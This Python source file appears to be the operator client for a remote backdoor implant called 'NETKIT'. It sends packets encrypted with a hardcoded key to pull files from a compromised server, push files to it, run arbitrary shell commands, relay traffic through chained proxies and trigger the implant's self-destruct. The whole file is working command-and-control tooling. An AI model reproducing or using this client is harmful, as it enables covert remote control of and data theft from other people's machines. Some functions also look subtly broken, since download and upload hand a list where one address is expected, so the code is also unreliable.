#!/usr/bin/env python3

from pwn import p32, p8, xor
import socket
from Crypto.Cipher import AES
import time
import os
import sys


AUTH_PASSWORD = 0

CMD_FILE_READ = 0
CMD_FILE_WRITE = 1
CMD_FILE_EXEC = 2
CMD_PROXY = 3
CMD_EXIT = 4


class PacketReq:
    def __init__(self, auth_id: int, password: bytes, cmd_id: int, content: bytes):
        self.auth_id = auth_id
        self.password = password
        self.cmd_id = cmd_id
        self.content = content

    def __bytes__(self):
        return self.encrypt(p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content)
    
    def encrypt(self, plaintext: bytes) -> bytes:
        print = lambda *x: ...

        data = xor(plaintext, b"NETKIT_XOR")[:len(plaintext)]
        print('\nxor:', data)

        padlen = 16-(len(data) % 16)
        if padlen == 16:
            padlen = 0

        data += padlen.to_bytes(1, 'little') * padlen
        print(f'\npad: {data} ({len(data)-padlen})')

        iv = b"IV"*8
        cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
        data = iv + cipher.encrypt(data)
        print('\naes:', data)

        return data


class PacketRes:
    def __init__(self, ciphertext: bytes):
        data = self.decrypt(ciphertext)
        self.retv = int.from_bytes(data[:4], 'little', signed=True)
        self.domain = data[4]
        self.content = data[5:]

    def decrypt(self, ciphertext: bytes) -> bytes:
        print = lambda *x: ...

        print("\n==========")
        cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, ciphertext[:16])
        pad = cipher.decrypt(ciphertext[16:])
        data = pad[:-ord(pad[len(pad)-1:])]
        print('\naes:', data)

        data = xor(data, b"NETKIT_XOR")[:len(data)]
        print('\nxor:',  data)

        return data


def encapsulate_proxies(proxy_list: list[tuple[str, int]], packet: PacketReq) -> bytes:
    for i, addr in enumerate(proxy_list[:-1]):
        next_addr = proxy_list[i+1]
        content = socket.inet_aton(next_addr[0])
        port = socket.htons(next_addr[1]).to_bytes(2, 'little')
        packet = PacketReq(0, packet.password, CMD_PROXY, content + port + bytes(packet))

    return bytes(packet)


def decapsulate_proxies(proxy_list: list[tuple[str, int]], packet: bytes) -> bytes:
    for i, addr in enumerate(proxy_list[:-1]):
        packet = PacketRes(packet).content

    return packet


def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(addr)

    data = sendbuf
    print('\nsend:', data)

    start = time.perf_counter()
    s.sendall(data)
    data = s.recv(65536)
    end = time.perf_counter()
    s.close()

    print(f"time: {(end - start) * 1000}ms")

    if len(data) == 0:
        raise Exception("[!] auth failed")
    
    print(f'recv ({len(data)} bytes):', data)

    return data


def download(proxy_list: list[tuple[str, int]], password: bytes, filename: str):
    packet = PacketReq(0, password, CMD_FILE_READ, filename.encode())

    rsp = PacketRes(sendrecv(proxy_list, bytes(packet)))
    if rsp.retv < 0:
        print(f"[-] failed to download file '{filename}' from server")
        return

    filename_flat = filename.replace("/", "__")
    with open(filename_flat, "wb") as f:
        f.write(rsp.content)

    print(f"[+] file successfully downloaded '{filename}' as '{filename_flat}'")


def upload(proxy_list: list[tuple[str, int]], password: bytes, filename_local: str, filename_remote: str):
    with open(filename_local, "rb") as f:
        content = f.read()

    packet = PacketReq(0, password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)

    rsp = PacketRes(sendrecv(proxy_list, bytes(packet)))
    if rsp.retv < 0:
        print(f"[-] failed to upload file '{filename_local}' to the server as '{filename_remote}'")
        return

    print(f"[+] successfully uploaded file '{filename_local}' as '{filename_remote}' to server")


def exec(proxy_list: list[tuple[str, int]], password: bytes, pwd: str, cmd: str):
    raw_packet_send = PacketReq(0, password, CMD_FILE_EXEC, f"cd {pwd} && {cmd}".encode())
    proxy_packet_enc: bytes = encapsulate_proxies(proxy_list, raw_packet_send)
    raw_packet_recv = sendrecv(proxy_list[0], proxy_packet_enc)
    proxy_packet_dec: bytes = decapsulate_proxies(proxy_list, raw_packet_recv)

    rsp = PacketRes(proxy_packet_dec)
    if rsp.retv == 0x7f00:
        print(f"command not found (something went wrong): {cmd.split(' ')[0]}")
        return
    elif rsp.retv != 0:
        print(f"retv: {rsp.retv}, domain: {rsp.domain}")

    print(rsp.content.decode())


def server_exit(proxy_list: list[tuple[str, int]], password):
    packet = PacketReq(0, password, CMD_EXIT, b"")

    sendrecv(proxy_list[0], bytes(packet))
    print("[+] successfully self-destructed the server")


def main(argv):
    password = b"password"
    pwd = os.path.abspath("/")
    proxy_list = []
    if len(argv) > 1:
        for arg in argv[1:]:
            ip, port = arg.split(":")
            proxy_list.append((ip, int(port)))

    print(proxy_list)

    while True:
        argv = input("$ ").strip(" ").split()
        if argv == []:
            continue
        elif argv[0].lower() == "download":
            download(proxy_list, password, argv[1])
        elif argv[0].lower() == "upload":
            upload(proxy_list, password, argv[1], argv[2])
        elif argv[0].lower() == "[self-destruct]":
            server_exit(proxy_list, password)
            break
        elif argv[0].lower() == "cd":
            pwd = os.path.normpath(os.path.join(pwd, argv[1]))
        elif argv[0].lower() == "exit":
            break
        else:
            exec(proxy_list, password, pwd, ' '.join(argv))


if __name__ == "__main__":
    main(sys.argv)
